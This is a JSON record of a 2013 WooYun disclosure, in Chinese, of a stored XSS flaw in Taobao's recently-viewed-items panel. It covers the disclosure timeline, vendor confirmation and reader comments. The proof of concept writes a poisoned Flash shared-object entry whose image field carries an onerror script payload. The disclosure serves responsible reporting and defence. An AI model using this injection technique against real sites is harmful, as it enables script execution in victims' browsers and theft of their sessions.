{"id": 12488, "wybug_id": "wooyun-2013-022080", "wybug_title": "淘宝某处存储型XSS漏洞", "wybug_corp": "淘宝网", "wybug_author": "p.z", "wybug_date": "2013-04-18 16:00", "wybug_open_date": "2013-06-02 16:01", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "应用安全", "黑盒测试技巧", "技巧", "前端客户端逻辑漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-04-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-05-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-05-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-06-02：\t细节向公众公开  简要描述： 未对输出进行过滤 详细说明：  http://list.taobao.com/itemlist/default.htm搜索页中有一个最近浏览商品的栏目, 从flash的shared objcet中取出数据之间展现,为进行过滤,如果shared objcet存在恶意数据,会造成xss.   漏洞证明：  \n\n\n\n\n<script>function updateLsoSaverStatus(status){\tif(status == 2){\t\tdocument['J_lsoSaver'].save('tb_recent_viewed_items','[{\"itemId\":\"16023262435\",\"pic\":\"i1%2FT1o4T0Xn4hXXbdPVbb_122616.jpg%22><img src=2 onerror=alert(document.domain)>\",\"price\":\"15800\",\"title\":\"%E9%A1%BA%E8%BE%BE%E9%93%B6%E9%B2%B8%E7%81%B5%E6%B6%A6%E9%AB%98%E5%8E%8B%E9%94%85%E5%A4%8D%E5%BA%95%E4%B8%8D%E9%94%88%E9%92%A2%E5%8E%8B%E5%8A%9B%E9%94%85%2024cm%20%E8%B6%85%E5%8E%9A%E9%AB%98%E5%8E%8B%E9%94%85SDF-9624\",\"isDaily\":false},{\"url\":\"http%3A%2F%2Fitem.taobao.com%2Fitem.htm%3Fid%3D15621327776\",\"itemId\":\"15621327776\",\"xid\":\"\",\"pic\":\"i2%2FT1q1iGXkpzXXbDQSTb_094946.jpg\",\"price\":\"8900\",\"itemIdStr\":\"15621327776\",\"title\":\"%E4%B8%93%E6%9F%9C%E6%AD%A3%E5%93%81%20%E9%A1%BA%E8%BE%BE20CM%20%E7%BB%84%E5%90%88%E7%9B%96%E5%A4%8D%E5%BA%95%E6%97%A5%E5%BC%8F%E8%92%B8%E9%94%85SDF-8121%E4%B8%8D%E9%94%88%E9%92%A2%E8%92%B8%E7%85%AE%E9%94%85\",\"isDaily\":false}]')\t}}</script>Taobao xss poc<object id=\"J_lsoSaver\" tabindex=\"-1\" classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" width=\"1\" height=\"1\" codebase=\"http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab\">\t<param name=\"movie\" value=\"http://a.tbcdn.cn/app/tbskip/lsoSaver.swf\">\t<param name=\"allowScriptAccess\" value=\"always\">\t<embed name=\"J_lsoSaver\" src=\"http://a.tbcdn.cn/app/tbskip/lsoSaver.swf\" width=\"1\" height=\"1\" allowscriptaccess=\"always\" type=\"application/x-shockwave-flash\" pluginspage=\"http://www.adobe.com/go/getflashplayer\"></object>\n   修复方案：  输出过滤   版权声明：转载请注明来源 p.z@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2013-04-19 13:12 厂商回复： 感谢您对我们的关注与支持，该漏洞我们会尽快修复~~稍后会有礼物送出~~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-04-18 16:45 |    \t\t Jesus \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:18        | 天地不仁,以万物为刍狗！)\t\t \n  以前...支付宝...第三方插件...然后...    \n     2013-04-18 16:52 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:17        | 当我又回首一切,这个世界会好吗?)\t\t \n  看来是在写ppt了 加油哟    \n     2013-04-18 17:20 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:41        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  看来是在写ppt了 加油哟    \n     2013-04-18 19:45 |    \t\t豆芽 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 修行中)\t\t \n  看来是在写ppt了 加油哟    \n     2013-04-19 13:20 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:125        | 如果大海能够带走我的矮丑...)\t\t \n  看来是在写ppt了 加油哟    \n     2013-06-03 01:10 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:84        )\t\t \n  pz姐加油    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}